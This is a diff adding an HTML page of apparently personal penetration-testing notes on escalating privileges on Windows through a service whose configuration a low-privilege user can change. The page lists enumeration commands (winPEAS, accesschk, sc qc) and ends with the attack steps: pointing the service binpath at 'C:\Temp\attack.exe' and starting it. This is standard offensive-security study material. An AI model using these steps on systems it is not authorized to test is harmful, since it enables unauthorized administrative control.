@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Insecure service permission</title>
+</head><body>Potential Rabbit Hole:<b>&nbsp;<br/>
+</b><b>If you can cange a service configuration but can't stop/start the service, you may not be able to escalate privileges<br/>
+<br/>
+<br/>
+Identification<br/>
+</b><br/>
+<b>./winPEASany.exe quite serviceinfo<br/>
+<br/>
+[search]: Modifiable Services<br/>
+</b>&lt;get service name&gt;<b><br/>
+</b><br/>
+<br/>
+<b>re-check<br/>
+</b><br/>
+.\accesschk.exe /accepteula -uwcqv user &lt;service name&gt;<br/>
+<br/>
+<img src="image.png" width="392" height="150" /><br/>
+<b><br/>
+</b><b>check the configuration</b><br/>
+sc qc &lt;service name&gt;<br/>
+<img src="image 2.png" width="410" height="150" /><br/>
+<b>check the status</b><br/>
+sc query &lt;service name&gt;<br/>
+<br/>
+<br/>
+<b>update the config</b><br/>
+<br/>
+sc config &lt;servicename&gt; binpath= "\"C:\Temp\attack.exe\""<br/>
+<br/>
+<br/>
+<b>start service<br/>
+</b>net start &lt;service name&gt;<b><br/>
+</b><b><br/>
+</b><br/>
+</body></html>
